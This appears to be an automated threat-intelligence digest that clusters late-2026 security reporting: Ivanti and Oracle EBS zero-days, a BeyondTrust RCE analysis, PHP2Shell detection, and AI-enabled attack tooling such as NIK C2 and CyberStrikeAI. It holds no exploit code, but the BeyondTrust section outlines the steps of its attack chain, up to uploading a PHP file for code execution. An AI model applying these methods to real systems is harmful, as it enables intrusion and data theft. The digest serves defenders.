- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview On October 29, 2026, Ivanti updated its security advisory for Ivanti Connect Secure (ICS) to include two additional vulnerabilities and released fixes for both. Ivanti rates CVE-2026-111357 , a missing authentication for critical function vulnerability ( CWE-306 ), with a CVSSv3.1 score of 8.8 ; it allows a local authenticated attacker to escalate privileges. CVE-2026-118527 , classified as generation of predictable numbers or identifiers ( CWE-340 ), has an Ivanti-assigned CVSSv3.0 score of 4.3 and, according to CISA's KEV entry , allows a remote authenticated attacker to upload attacker-controlled content to a known location on disk. Per Ivanti, exploitation in the wild has already occurred prior to disclosure, affecting a limited number of customers when these flaws are chained with CVE-2026-104935 , an authentication bypass by spoofing ( CWE-290 ). Rapid7 covered the original disclosure on October 13, 2026 , when a fix for CVE-2026-104935 was available but the privilege es
```

#### Full body

```
Rapid7 Intelligence Additional Ivanti Connect Secure zero-days exploited in the wild (CVE-2026-111357, CVE-2026-118527) Rapid7 Nov 2, 2026 | Last updated on Nov 2, 2026 | 4 min read Additional Ivanti Connect Secure zero-days exploited in the wild (CVE-2026-111357, CVE-2026-118527) Table of contents Additional Ivanti Connect Secure zero-days exploited in the wild (CVE-2026-111357, CVE-2026-118527) Table of contents Overview On October 29, 2026, Ivanti updated its security advisory for Ivanti Connect Secure (ICS) to include two additional vulnerabilities and released fixes for both. Ivanti rates CVE-2026-111357 , a missing authentication for critical function vulnerability ( CWE-306 ), with a CVSSv3.1 score of 8.8 ; it allows a local authenticated attacker to escalate privileges. CVE-2026-118527 , classified as generation of predictable numbers or identifiers ( CWE-340 ), has an Ivanti-assigned CVSSv3.0 score of 4.3 and, according to CISA's KEV entry , allows a remote authenticated attacker to upload attacker-controlled content to a known location on disk. Per Ivanti, exploitation in the wild has already occurred prior to disclosure, affecting a limited number of customers when these flaws are chained with CVE-2026-104935 , an authentication bypass by spoofing ( CWE-290 ). Rapid7 covered the original disclosure on October 13, 2026 , when a fix for CVE-2026-104935 was available but the privilege escalation component remained unpatched. Fixes are now available for all three vulnerabilities. On October 30, 2026, CVE-2026-111357 and CVE-2026-118527 were added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) list of known exploited vulnerabilities (KEV), based on evidence of active exploitation. The following scores and classifications are from Ivanti's updated advisory: CVE Ivanti CVSS score CWE Impact CVE-2026-104935 8.6 (High), CVSSv3.0 CWE-290 Remote unauthenticated command execution CVE-2026-111357 8.8 (High), CVSSv3.1 CWE-306, CWE-862, CWE-345 Local authenticated privilege escalation CVE-2026-118527 4.3 (Medium), CVSSv3.0 CWE-340 Remote authenticated file upload to a known path Note: The CVE record and Rapid7's vulnerability database rate CVE-2026-111357 at 7.0 , using high attack complexity and unchanged scope. Ivanti assesses low attack complexity and changed scope, resulting in its score of 8.8. The table follows Ivanti's scores and classifications. In its investigation , Volexity reports that UTA0576 used an exploit chain to gain unauthenticated root access to an appliance running 22.8R2.4 , beginning on October 3, 2026. Its write-up identifies CVE-2026-104935 and CVE-2026-111357; Ivanti's updated advisory identifies CVE-2026-118527 as an additional component of the chain. Volexity observed credential theft and Active Directory queries for Windows LAPS passwords and BitLocker recovery keys. The combined impact warrants emergency remediation despite the individual CVSS ratings. Ivanti Connect Secure is an enterprise VPN solution deployed at the network edge and has a history of zero-day exploitation, including in 2024 and 2025 . Mitigation guidance Rapid7 recommends applying the available updates on an emergency basis outside of normal patching cycles. The October 13 fixes in 25.1.1.2 and 22.8R2.5 do not remediate CVE-2026-111357 or CVE-2026-118527. CVE(s) Affected versions Fixed version(s) CVE-2026-111357 and CVE-2026-118527 25.1.1.2 and prior 25.1.1.3 CVE-2026-111357 and CVE-2026-118527 22.8R2.5 and prior 22.8R2.6 CVE-2026-104935 25.1.1.1 and prior 25.1.1.2 CVE-2026-104935 25.1.2.2 and prior 25.1.3.0 , 25.1.3.1 CVE-2026-104935 22.8R2.4 and prior 22.8R2.5 Ivanti recommends moving from 22.8.X to 25.1.1.3 or later, or applying 22.8R2.6 if migration is not immediately possible. Ivanti lists 25.1.3.0 and later on ISA4500, ISA6500, or ISA8500 as unaffected. Rapid7 also recommends investigating for compromise after patching. Volexity reports that the observed activity evades Ivanti's Integrity Checker Tool, s
```

#### Corroborating sources (5)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Additional Ivanti Connect Secure zero-days exploited in the wild (CVE-2026-111357, CVE-2026-118527)
  - Published: 2026-11-02T11:04:08+00:00
  - Link: https://www.rapid7.com/blog/post/etr-additional-ivanti-connect-secure-zero-days-exploited-in-the-wild-cve-2026-111357-cve-2026-118527
  - Summary: Overview On October 29, 2026, Ivanti updated its security advisory for Ivanti Connect Secure (ICS) to include two additional vulnerabilities and released fixes for both. Ivanti rates CVE-2026-111357 , a missing authentication for critical function vulnerability ( CWE-306 ), with a CVSSv3.1 score of 8.8 ; it allows a local authenticated attacker to escalate privileges. CVE-2026-118527 , classified as generation of predictable numbers or identifiers ( CWE-340 ), has an Ivanti-assigned CVSSv3.0 score of 4.3 and, according to CISA's KEV entry , allows a remote authenticated attacker to upload attacker-controlled content to a known location on disk. Per Ivanti, exploitation in the wild has already occurred prior to disclosure, affecting a limited number of customers when these flaws are chained with CVE-2026-104935 , an authentication bypass by spoofing ( CWE-290 ). Rapid7 covered the original disclosure on October 13, 2026 , when a fix for CVE-2026-104935 was available but the privilege es
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Chain Three Ivanti Connect Secure Flaws to Gain Unauthenticated Root Access
  - Published: 2026-10-31T08:27:43+00:00
  - Link: https://thehackernews.com/2026/10/attackers-chain-three-ivanti-connect.html
  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Friday added two security flaws impacting Ivanti Connect Secure (ICS) to its Known Exploited Vulnerabilities (KEV) catalog, following active exploitation in the wild. The vulnerabilities are listed below - CVE-2026-111357 (CVSS score: 8.8) - A missing authentication for a critical function vulnerability that could allow a
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Ivanti Patches Two More Zero-Days Exploited in Connect Secure Attack Chain
  - Published: 2026-11-02T07:57:49+00:00
  - Link: https://www.securityweek.com/ivanti-patches-two-more-zero-days-exploited-in-connect-secure-attack-chain/
  - Summary: CISA has added CVE-2026-111357 and CVE-2026-118527 to its KEV catalog after the Ivanti VPN flaws were chained in zero-day attacks. The post Ivanti Patches Two More Zero-Days Exploited in Connect Secure Attack Chain appeared first on SecurityWeek .
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: CISA to federal agencies: Remediate exploited Ivanti Connect Secure vulnerabilities (CVE-2026-111357, CVE-2026-118527)
  - Published: 2026-11-02T15:58:08+00:00
  - Link: https://www.helpnetsecurity.com/2026/11/02/cisa-to-federal-agencies-remediate-exploited-ivanti-connect-secure-vulnerabilities-cve-2026-111357-cve-2026-118527/
  - Summary: CISA added two new Ivanti Connect Secure vulnerabilities (CVE-2026-111357, CVE-2026-118527) to its Known Exploited Vulnerabilities catalog on Friday, after Ivanti updated an earlier security advisory with details about the flaws. Three flaws chained to gain a foothold CVE-2026-111357, a missing authentication for a critical function vulnerability that allows a local authenticated attacker to escalate their privileges, and CVE-2026-118527, a “Generation of Predictable Numbers or Identifiers Vulnerability” that makes remote authenticated file upload possible, have been … More → The post CISA to federal agencies: Remediate exploited Ivanti Connect Secure vulnerabilities (CVE-2026-111357, CVE-2026-118527) appeared first on Help Net Security .
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Ivanti patches two more Connect Secure zero-days chained in attacks
  - Published: 2026-11-02T09:33:26+00:00
  - Link: https://www.bleepingcomputer.com/news/security/ivanti-patches-two-more-connect-secure-zero-days-chained-in-attacks/
  - Summary: Ivanti released security updates to patch two more Connect Secure (ICS) remote access gateway flaws that have been chained in zero-day attacks since at least October 1. [...]

### Cluster 5fe11c121c — score 45

- Title: CVE-2026-101767: Critical Oracle EBS SQL Injection Actively Probed in the Wild
- Source: Orca Security Research (cloud_identity_infrastructure)
- Published: 2026-10-28T20:57:18+00:00
- Link: https://orca.security/resources/research/cve-2026-101767-critical-oracle-ebs-sql-injection-actively-probed-in-the-wild/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-101767

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach
- actor_attribution: Cl0p
- affected_industries: financial_services
- cve_ids: CVE-2026-101767
- urgency_signals: actively_exploited, critical_cvss, preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach, active_exploitation
- actor_attribution: Cl0p
- affected_industries: financial_services
- cve_ids: CVE-2026-101767
- urgency_signals: actively_exploited, preauth_unauth, critical_cvss
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
What is CVE-2026-101767? A critical vulnerability (CVE-2026-101767, CVSS 9.8) was disclosed affecting Oracle E-Business Suite’s Application Object Library, allowing attackers to achieve full remote code execution and system takeover via an unauthenticated SQL injection in the Thin Client Framework servlet. Due to the potential for complete compromise of financial, payroll, and HR data managed by […]
```

#### Full body

```
What is CVE-2026-101767? A critical vulnerability (CVE-2026-101767, CVSS 9.8) was disclosed affecting Oracle E-Business Suite’s Application Object Library, allowing attackers to achieve full remote code execution and system takeover via an unauthenticated SQL injection in the Thin Client Framework servlet. Due to the potential for complete compromise of financial, payroll, and HR data managed by EBS, immediate patching is required. How the Oracle EBS SQL injection leads to remote code execution The issue originates from the Application Object Library’s TCF servlet at /OA_HTML/AppsTCFServer, where missing authentication on a critical function combined with improper input sanitization leads to SQL injection as the privileged APPS database user. By sending specially crafted POST requests to the servlet instantiating oracle.apps.jtf.gantt.server.GanttDataServer, attackers can execute arbitrary SQL commands and chain to operating system command execution as the EBS application account, potentially achieving full takeover of the EBS instance and all data it manages. No authentication is required to exploit this issue. CVE-2026-101767 disclosure and exploitation timeline The vulnerability was discovered by Horizon3.ai and reported to Oracle on July 24, 2026. Oracle addressed it in the October 2026 Critical Patch Update, released October 20. Within a week of the patch release, threat intelligence firm Defused observed exploratory exploitation attempts hitting Oracle EBS honeypots on October 27. EBS has historically been a target for financially motivated threat actors, including the Cl0p group’s large-scale EBS campaign the previous year. Which Oracle E-Business Suite versions are affected? The following components are affected: Oracle E-Business Suite Application Object Library, versions 12.2.3 through 12.2.15. Oracle notes that earlier unsupported versions are likely also affected. The vulnerable servlet passes through the default EBS URL firewall configuration, meaning any internet-facing EBS instance with default settings is exposed. Organizations running EBS for financial, payroll, HR, and procurement operations face elevated risk due to the sensitive data accessible through the APPS database user. How to patch and mitigate CVE-2026-101767 Users should apply the October 2026 Critical Patch Update immediately (details in My Oracle Support Note KA923), and also patch the underlying EBS Database and Fusion Middleware components, which have separate CPU entries. As interim mitigations until patching is complete, administrators should remove /OA_HTML/AppsTCFServer from the EBS URL firewall allowlist and restrict network access to the EBS web tier to trusted networks only. Is CVE-2026-101767 being exploited in the wild? At the time of writing, Horizon3.ai has published technical details of the attack chain, and active probing has been confirmed in the wild by Defused. The vulnerability is not yet listed on CISA’s Known Exploited Vulnerabilities catalog. Regardless, the severity and ease of exploitation make this vulnerability high risk, especially in internet-facing deployments. What attackers can do with a compromised Oracle EBS instance Successful exploitation could allow attackers to execute arbitrary SQL and OS commands as the APPS and EBS application accounts, exfiltrate or manipulate sensitive financial, payroll, and HR data, and potentially pivot to other systems within the network, leading to service disruption, data exposure, or full infrastructure compromise. How Orca helps find and prioritize vulnerable Oracle EBS assets Orca enables customers to quickly identify assets running vulnerable versions of Oracle E-Business Suite, understand their exposure in context, including internet accessibility, runtime reachability, and asset criticality, and prioritize remediation based on real risk rather than CVSS alone. Orca’s platform highlights affected assets directly in the newItem view, helping security teams focus on the most crit
```

#### Corroborating sources (2)

- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: CVE-2026-101767: Critical Oracle EBS SQL Injection Actively Probed in the Wild
  - Published: 2026-10-28T20:57:18+00:00
  - Link: https://orca.security/resources/research/cve-2026-101767-critical-oracle-ebs-sql-injection-actively-probed-in-the-wild/
  - Summary: What is CVE-2026-101767? A critical vulnerability (CVE-2026-101767, CVSS 9.8) was disclosed affecting Oracle E-Business Suite’s Application Object Library, allowing attackers to achieve full remote code execution and system takeover via an unauthenticated SQL injection in the Thin Client Framework servlet. Due to the potential for complete compromise of financial, payroll, and HR data managed by […]
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Hackers Target Critical Oracle E-Business Suite RCE Flaw Days After Security Patch
  - Published: 2026-10-28T12:48:03+00:00
  - Link: https://thehackernews.com/2026/10/hackers-target-critical-oracle-e.html
  - Summary: Threat actors are beginning to probe for a newly patched critical vulnerability in Oracle E-Business Suite (EBS), according to threat intelligence firm Defused Cyber. The vulnerability in question is CVE-2026-101767 (CVSS score: 9.8) , a case of improper authentication in the Oracle Application Object Library of Oracle E-Business Suite. It was patched by Oracle last week as part of its Critical

### Cluster 8df24b48a3 — score 33

- Title: NIK C2: The new AI-enabled command-and-control framework
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-10-29T10:00:00+00:00
- Link: https://blog.talosintelligence.com/nik-c2-new-ai-enabled-framework/
- Fetch status: ok
- Member count: 3
- Corroborating source count: 2
- Strong signals: Cisco

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, credential_theft, ransomware_extortion
- affected_products: Cisco, OpenAI/ChatGPT
- cve_ids: CVE-2026-20127
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, credential_theft, active_exploitation
- affected_products: Cisco, OpenAI/ChatGPT
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Cisco Talos observed a new AI-integrated command-and-control (C2) framework in the wild called “NIK C2.”
```

#### Full body

```
NIK C2: The new AI-enabled command-and-control framework By Chetan Raghuprasad Thursday, October 29, 2026 06:00 Threats AI Cisco Talos observed a new AI-integrated command-and-control (C2) framework in the wild called “NIK C2.” NIK C2 contains a Windows implant, using which, an actor can dump credentials, stream the victim's keystrokes to collect the targeted victim’s sensitive data, and instruct an integrated AI model to analyze the harvested data, all within the compromised session. In this framework, the actor has abused the OpenAI Chat Completions application programming interface (API), which is a HTTP endpoint that enables ChatGPT-style conversations programmatically. In addition to the features that enable theft, an actor can also deploy desktop screen-locking ransomware via the NIK C2 implant onto the victim machine, leading to a ransom demand in Bitcoin or USDT cryptocurrencies. NIK C2 reshapes adversary tradecraft by collapsing collection and exploitation into a single continuous session, effectively erasing the offline processing delays that historically granted defenders critical detection windows. Such AI-enabled adversarial frameworks require defenders to move beyond traditional detection and embrace continuous behavioral vigilance as the new baseline. NIK C2 implant: AI-integrated remote access tool The NIK C2 implant is a Go-based, 64-bit Windows remote access tool that grants persistent control over compromised hosts using a resilient dual-channel C2 architecture. It communicates over TLS-secured WebSockets on port 443 alongside an HTTP fallback polling loop every 250 milliseconds, protecting all traffic with AES-256-GCM encryption derived from a hardcoded seed. To survive takedowns, the implant routes traffic across three prioritized C2 tiers, which are runtime-updated URLs, an embedded encrypted server list, and a hardcoded fallback address. Beyond standard operations, the implant features surveillance, theft, lateral movement, and evasion capabilities, including credential dumping, RDP session hijacking, process hollowing, and a C2-driven screen lock ransomware module. Notably, the NIK C2 implant embeds a fully integrated OpenAI API client via its ai_generate command, allowing operators to route arbitrary prompts to the OpenAI Chat Completions API directly through the infected host. The NIK C2 implant manages API key resolution, request assembly, and response parsing locally, returning the encrypted generative AI results to the actor's C2. The observed NIK C2 implant samples in the wild contains an embedded build path (/opt/nik_panel/data/build_52b79724a1fc4b8f/main.go), which identifies the project as "nik_panel" and indicates that the implant was cross compiled for Windows from a Linux development environment. Furthermore, the embedded eight-byte hex token matching the build identifier highlights that the threat actor's infrastructure actively tracking and versioning the implants. Figure 1. NIK C2 implant’s operational architecture. NIK C2 implant evolution timeline Talos observed that the NIK C2 implant development trajectory spans at least three distinct versions. All binaries observed in the wild were compiled with Go 1.23.4 (which was released in December 2024), placing the entire sample set compiled no earlier than late 2024. The actor has Zeroed PE TimeDateStamp fields and near-epoch filesystem timestamps (manifesting as Nov 29, 1979) are applied consistently across all samples. We developed a timeline based on the initial sighting dates of NIK C2 implant variants in OSINT. Figure 2. NIK C2 implant evolution timeline. The pace of capability addition across the three versions indicates a technically proficient team with prior malware operations experience is actively expanding NIK C2 towards a full-service adversarial framework. Active NIK C2 server seen in the wild During our research, we observed that a threat actor hosted the NIK C2 framework on a server at IP address “87.120.196[.]120”, resolving
```

#### Corroborating sources (2)

- **Cisco Talos** (threat_research_primary)
  - Title: NIK C2: The new AI-enabled command-and-control framework
  - Published: 2026-10-29T10:00:00+00:00
  - Link: https://blog.talosintelligence.com/nik-c2-new-ai-enabled-framework/
  - Summary: Cisco Talos observed a new AI-integrated command-and-control (C2) framework in the wild called “NIK C2.”
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Hackers Exploited Cisco SD-WAN Flaw to Plant Malware Built to Steal Encryption Keys
  - Published: 2026-10-29T08:24:22+00:00
  - Link: https://thehackernews.com/2026/10/hackers-exploited-cisco-sd-wan-flaw-to.html
  - Summary: Hackers exploited a critical Cisco Catalyst SD-WAN flaw, fixed in February, to plant custom malware inside the systems that control an organization's SD-WAN network. The malware, called KeyDrift, is designed to copy the keys that encrypt traffic between sites and store them for later use, Cisco Talos said on October 28. Talos calls the attacks historical but does not specify when they

### Cluster 91d1381147 — score 30

- Title: Rapid7 Analysis: Unauthenticated File Upload to RCE in BeyondTrust Remote Support (CVE-2026-102764)
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-10-30T16:01:53+00:00
- Link: https://www.rapid7.com/blog/post/ra-rapid7-analysis-unauthenticated-file-upload-to-rce-in-beyondtrust-remote-support-cve-2026-102764
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-102764

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-102764
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- cve_ids: CVE-2026-102764
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview An origin-validation flaw in BeyondTrust Remote Support lets an unauthenticated attacker write files on the appliance and execute code as the site's operating-system user. The entry point is the public customer connection used to start a support session. No account credentials or user interaction are required. The flaw sits between the internal message router, brain , and an appliance-side customer worker, thin-scc . An attacker can put a reserved local router ID into a message's source address. The router forwards the message, and the worker accepts that address as proof that the request came from a local component. This gives the attacker access to an internal file-transfer service, including its native filesystem provider. We first confirmed the file write then used the primitive to upload a PHP file to the site's public directory. Requesting that file gave us code execution as the site user. A Metasploit module now implements the chain with PHP and Unix Command targets. We
```

#### Full body

```
Rapid7 Analysis Rapid7 Analysis: Unauthenticated File Upload to RCE in BeyondTrust Remote Support (CVE-2026-102764) Jack Heysel Oct 30, 2026 | Last updated on Oct 30, 2026 | 21 min read Rapid7 Analysis: Unauthenticated File Upload to RCE in BeyondTrust Remote Support (CVE-2026-102764) Table of contents Rapid7 Analysis: Unauthenticated File Upload to RCE in BeyondTrust Remote Support (CVE-2026-102764) Table of contents Overview An origin-validation flaw in BeyondTrust Remote Support lets an unauthenticated attacker write files on the appliance and execute code as the site's operating-system user. The entry point is the public customer connection used to start a support session. No account credentials or user interaction are required. The flaw sits between the internal message router, brain , and an appliance-side customer worker, thin-scc . An attacker can put a reserved local router ID into a message's source address. The router forwards the message, and the worker accepts that address as proof that the request came from a local component. This gives the attacker access to an internal file-transfer service, including its native filesystem provider. We first confirmed the file write then used the primitive to upload a PHP file to the site's public directory. Requesting that file gave us code execution as the site user. A Metasploit module now implements the chain with PHP and Unix Command targets. We tested Remote Support 24.1.2, build 1524046 , revision 4208-ddcf90715106aa0c0e19c103f8d2c412af4beff3 . The test appliance had public issue-menu session starts and thin chat enabled (default). Other affected releases and fixed builds have not been established. The VM's base appliance version of Secure Remote Access, 7.1.0 , is separate from the Remote Support application version. Impact The attacker controls both the contents of an uploaded file and its destination path, subject to the worker's filesystem permissions. The same origin forgery also reaches the file-send operation. We used it to retrieve /proc/self/environ to determine the base installation path of the Remote Support before dropping the payload On the tested appliance, the native file service could write into the PHP document root. The Metasploit module returns code execution in the context of msfuser , UID 1000, which establishes unauthenticated remote code execution as the site user. Technical Analysis We will demonstrate how an attacker can start an anonymous session and then forge a message that the appliance will accept as local. Then outline how we can reach the native file transfer service, choose the uploaded file’s contents and destination and turn the file write into PHP execution. Addresses use Ghidra image base 0x100000 . Subtract that value for the raw ELF virtual address. Function names beginning with FUN_ are Ghidra labels; descriptive names are taken from diagnostic strings where available. Starting an anonymous customer session We begin by obtaining two customer keys from POST /api/start_session . These are fresh public guest sessions. The keys let the client use the customer transport, but do not identify a logged-in account. Each guest connects through the /nw WebSocket endpoint, using either the native or thin customer protocol. source/app/write_app_chooser_config: echo "ingredi support desk customer:|$BG_app_root/data/tmp/brain.sock" # [A1] echo "ingredi support desk customer thin:$BG_app_root/app/thin-scc-wrapper" # [A2] app/write_app_chooser_config shows where the two customer protocols go. The native protocol reaches the brain socket at [A1] ; the thin protocol launches a wrapper at [A2] . source/app/thin-scc-wrapper: # ... omitted: protocol parsing and the alternative debug-site branch ... quoted=$(export PHPRC="$BG_app_root/config/php-cli.ini"; echo $gskey | $ingrediRoot/app/dbquote) if [[ $(echo "SELECT COUNT(1) FROM gw_sessions WHERE session_key = $quoted AND session_type = 'sdcust' AND (expiration IS NULL OR expiration>NOW())" | $db) != "1"
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Rapid7 Analysis: Unauthenticated File Upload to RCE in BeyondTrust Remote Support (CVE-2026-102764)
  - Published: 2026-10-30T16:01:53+00:00
  - Link: https://www.rapid7.com/blog/post/ra-rapid7-analysis-unauthenticated-file-upload-to-rce-in-beyondtrust-remote-support-cve-2026-102764
  - Summary: Overview An origin-validation flaw in BeyondTrust Remote Support lets an unauthenticated attacker write files on the appliance and execute code as the site's operating-system user. The entry point is the public customer connection used to start a support session. No account credentials or user interaction are required. The flaw sits between the internal message router, brain , and an appliance-side customer worker, thin-scc . An attacker can put a reserved local router ID into a message's source address. The router forwards the message, and the worker accepts that address as proof that the request came from a local component. This gives the attacker access to an internal file-transfer service, including its native filesystem provider. We first confirmed the file write then used the primitive to upload a PHP file to the site's public directory. Requesting that file gave us code execution as the site user. A Metasploit module now implements the chain with PHP and Unix Command targets. We

### Cluster 5aa0fb9542 — score 30

- Title: PHP2Shell (CVE-2026-109618 and CVE-2026-109619): Detecting unauthenticated remote code execution in PHP core
- Source: Sysdig (detection_response_operations)
- Published: 2026-10-28T00:00:00+00:00
- Link: https://webflow.sysdig.com/blog/php2shell-cve-2026-109618-and-cve-2026-109619-detecting-unauthenticated-remote-code-execution-in-php-core
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-109618, CVE-2026-109619

#### Cluster taxonomy (union across members)
- affected_products: Palo Alto Networks
- cve_ids: CVE-2026-109618, CVE-2026-109619, CVE-2026-109691
- urgency_signals: poc_available, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research, tier_2_operator

#### Primary article taxonomy
- affected_products: Palo Alto Networks
- cve_ids: CVE-2026-109618, CVE-2026-109619, CVE-2026-109691
- urgency_signals: preauth_unauth, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
PHP2Shell (CVE-2026-109618 and CVE-2026-109619) lets an unauthenticated attacker run code on a PHP server with HTTP requests alone. The Sysdig Threat Research Team analyzed the exploitation and outlines affected versions, mitigations, and how to detect post-exploitation activity at runtime with Sysdig Secure and open source Falco.
```

#### Full body

```
threat-research This is some text inside of a div block. < back to blog PHP2Shell (CVE-2026-109618 and CVE-2026-109619): Detecting unauthenticated remote code execution in PHP core Published by: Sysdig Threat Research Team @ linkedin Subscribe to Threat Research READ MORE RESEARCH Published: October 28, 2026 Table of contents TRT in your inbox Get security briefings from the Threat Research Team New campaigns, attacker techniques, and detection guidance — straight to your inbox. Subscribe falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more This blog was originally published on October 22, 2026. As of October 28, there are four important updates to note: CISA added both CVE-2026-109618 and CVE-2026-109691 to its KEV Catalog on October 26. We previously stated there were exploitation attempts. Exploitation has since been confirmed . Multiple researchers have estimated the number of potentially vulnerable internet exposed hosts between 1.3 and 1.9 million . Some downstream vendors impacted by these vulnerabilities include Cisco and Palo Alto Networks . On October 21, 2026, CVE-2026-109618 and CVE-2026-109619 , dubbed PHP2Shell, were fixed in two emergency releases from the PHP project. The two CVEs group four related memory-safety bugs, and both vulnerabilities have a CVSS v4.0 score of 9.2. An unauthenticated attacker can exploit them to run code on a PHP server with HTTP requests alone. Multiple working proof-of-concept (PoC) exploits are circulating, and the researchers who reported the vulnerabilities said AI models helped in both discovery and exploit development. Researchers reported the bugs to PHP in August 2026, PHP started a coordinated fix in September, and coordinated disclosure was set for October 22. Then, on October 20, the CVE identifiers and exploit details leaked to Hacker News and social media. PHP published an advance notice the same day and moved the release forward by one day, to October 21 at 14:00 UTC. Exploitation did not wait for the patch. Amazon Threat Intelligence saw a PHP2Shell attempt against its MadPot honeypots on October 17, four days before disclosure. Cloudflare reported early attacks on October 21 at 07:43 UTC, more than six hours before the fix shipped. watchTowr reproduced the bugs and reported active exploitation attempts against each. The vulnerable code dates back to PHP 5.4, released in 2012. The bugs live in the PHP engine, not within any application. For that reason, any WordPress, Drupal, or Joomla site with clean application code is still exposed. To provide additional recommendations for security teams and create runtime detection coverage for Sysdig Secure and open source Falco users, the Sysdig Threat Research Team (TRT) analyzed PHP2Shell exploitation. The findings are outlined below. Affected PHP versions PHP version Status What to do 5.4-7.3 End of life, with no fix from the PHP project. Move to a patched branch. 7.4, 8.0, 8.1 No official update released. The PHP security team published minimal source backports only for these versions. Use a vendor-patched distribution package or move to a supported branch. 8.2, 8.3, 8.4, 8.5 Fixed in branches 8.2.35, 8.3.36, 8.4.27, 8.5.12 Update to the fixed release or later. In addition to the version number, there are three additional factors to consider for potential exposure to PHP2Shell: Distribution packages: Linux distributions and LTS vendors received the patches before release. Vendors often backport fixes without changing the upstream version number, so check the vendor advisory and not only php -v. Any package reporting an old version should be patched. Affected SAPIs: Every PHP installation that serves web requests. This includes Apache mod_php , PHP-FPM, php-cgi , FrankenPHP, and LiteSpeed. PHP rates mod_php as the highest risk. A SAPI is how PHP connects to a web server, so if P
```

#### Corroborating sources (2)

- **Sysdig** (detection_response_operations)
  - Title: PHP2Shell (CVE-2026-109618 and CVE-2026-109619): Detecting unauthenticated remote code execution in PHP core
  - Published: 2026-10-28T00:00:00+00:00
  - Link: https://webflow.sysdig.com/blog/php2shell-cve-2026-109618-and-cve-2026-109619-detecting-unauthenticated-remote-code-execution-in-php-core
  - Summary: PHP2Shell (CVE-2026-109618 and CVE-2026-109619) lets an unauthenticated attacker run code on a PHP server with HTTP requests alone. The Sysdig Threat Research Team analyzed the exploitation and outlines affected versions, mitigations, and how to detect post-exploitation activity at runtime with Sysdig Secure and open source Falco.
- **Unit 42** (threat_research_primary)
  - Title: Threat Brief: Critical Vulnerabilities in PHP: CVE-2026-109618, CVE-2026-109619 (Updated October 29)
  - Published: 2026-10-29T18:00:34+00:00
  - Link: https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619/
  - Summary: CVE-2026-109618 and CVE-2026-109619 are Critical vulnerabilities in PHP, a scripting language used globally for web servers and CMS systems. The post Threat Brief: Critical Vulnerabilities in PHP: CVE-2026-109618, CVE-2026-109619 (Updated October 29) appeared first on Unit 42 .

### Cluster 1561c1b49e — score 29

- Title: CyberStrikeAI in the wild: the use of AI in real-world attacks on organizations
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-11-02T08:00:24+00:00
- Link: https://securelist.com/tr/cyberstrikeai-attacks/121715/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng
- affected_industries: education
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng, active_exploitation
- affected_industries: education
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
We analyze a series of attacks on educational institutions that were fully automated during the post-exploitation phase using the CyberStrikeAI penetration testing framework.
```

#### Full body

```
Threat Response Table of Contents Introduction Timeline of the attack Technical details CyberStrikeAI overview Execution & Privilege Escalation Stealth Persistence Discovery Local Discovery Remote Discovery Domain Discovery Credential Access Lateral Movement Command & Control Collection & Exfiltration Attribution In summary Detection by Kaspersky solutions Indicators of compromise Introduction As part of proactive threat monitoring, Kaspersky’s Cyber Threat Intelligence team identified a malicious campaign involving C2 agents controlled by artificial intelligence. Confirmed victims of the campaign included organizations in the education sector in several countries across Africa and Latin America. CyberStrikeAI played a key role in the post-exploitation phase. This is an open-source framework in which an LLM orchestrator on the command-and-control server plans actions, selects tools, and generates commands, while an implant executes them on compromised hosts. Using CyberStrikeAI, the attackers progressed from reconnaissance to full domain compromise. According to our data, this is one of the first public descriptions of a compromise involving an LLM in the wild. The campaign we discovered clearly illustrates how the role of AI in attackers’ arsenals is evolving: until recently, language models were used primarily during preparatory stages – for writing phishing emails, debugging code, or searching for vulnerabilities. Now, however, they are being embedded into the very core of the attack, automating actions at every stage: payload execution, persistence on the host, discovery, lateral movement, and, finally, data collection and exfiltration. Post-exploitation – the stage that traditionally required manual work by an 